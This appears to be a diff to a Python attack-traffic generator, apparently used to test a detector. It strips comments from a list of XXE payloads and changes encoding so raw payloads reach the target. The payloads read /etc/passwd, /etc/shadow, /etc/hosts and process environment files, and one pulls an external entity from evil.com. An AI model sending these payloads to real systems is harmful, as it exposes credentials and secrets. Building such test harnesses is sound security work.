@@ -120,15 +120,10 @@ SSRF_PAYLOADS = [
 ]
 
 XXE_PAYLOADS = [
-    # Classic file disclosure via internal entity
     "/api/test?data=%3C!DOCTYPE+foo+%5B%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E",
-    # SYSTEM keyword targeting /etc/hosts
     "/api/test?xml=<!DOCTYPE+root+[<!ENTITY+ext+SYSTEM+'file:///etc/hosts'>]>",
-    # XInclude (xmlns:xi) attempt
     "/api/test?body=<root+xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include+href='file:///etc/shadow'/></root>",
-    # URL-encoded <!ENTITY marker (%3C = <, %21 = !)
     "/api/parse?input=%3C%21ENTITY+evil+SYSTEM+%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%3E",
-    # Generic entity reference probe
     "/api/test?content=<!DOCTYPE+x+[<!ENTITY+test+SYSTEM+'http://evil.com/xxe'>]>&q=&xxe;",
 ]
 
@@ -169,8 +164,13 @@ ATTACK_POOLS = {
 
 
 def send(target, path, user_agent=None, method="GET"):
-    encoded_path = urllib.parse.quote(path, safe="/?&=")
-    url = f"{target}{encoded_path}"
+    if "?" in path:
+        _raw_path, _raw_query = path.split("?", 1)
+        _encoded_path = urllib.parse.quote(_raw_path, safe="/%")
+        _url_path = f"{_encoded_path}?{_raw_query}"
+    else:
+        _url_path = urllib.parse.quote(path, safe="/%\\")
+    url = f"{target}{_url_path}"
     ua = user_agent or random.choice(NORMAL_USER_AGENTS)
     req = urllib.request.Request(url, headers={"User-Agent": ua})
     if method == "POST":
